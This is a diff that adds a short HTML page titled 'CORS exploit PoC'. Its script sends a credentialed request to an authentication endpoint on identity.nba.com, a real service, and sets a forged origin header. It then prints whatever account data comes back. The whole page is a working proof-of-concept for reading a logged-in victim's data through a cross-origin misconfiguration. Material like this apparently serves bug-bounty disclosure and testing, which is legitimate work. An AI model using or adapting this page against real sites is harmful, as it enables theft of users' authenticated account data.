@@ -1,0 +1,41 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>CORS exploit PoC</title>
+</head>
+<body>
+    <h1>CORS exploit PoC</h1>
+    <button id="exploitBtn">Fetch Data</button>
+    <p id="response"></p>
+    <pre id="responseOutput" style ="background: #f4f4f4; padding: 10px; border:1px solid #ccc; overflow-x:auto;"></pre>
+
+    <script>
+        document.getElementById('exploitBtn').addEventListener('click', () => {
+            fetch('https://identity.nba.com/api/v1/auth', {
+                method: 'GET',
+                credentials: 'include', // Include credentials (cookies, auth headers)
+                headers: {
+                    'origin': "http://nba.com"
+                }
+            })
+            .then(response => {
+                if (!response.ok) {
+                    throw new Error(`HTTP error! Status: ${response.status}`);
+                }
+                return response.text();
+            })
+            .then(data => {
+                document.getElementById('responseOutput').textContent = data;
+                alert("data fetch successfully.check the displayed output");
+            })
+            .catch(error => {
+                console.error("error fetching data, error");
+                alert("An error occured while fetching data.");
+
+            });
+        });
+    </script>
+</body>
+</html>
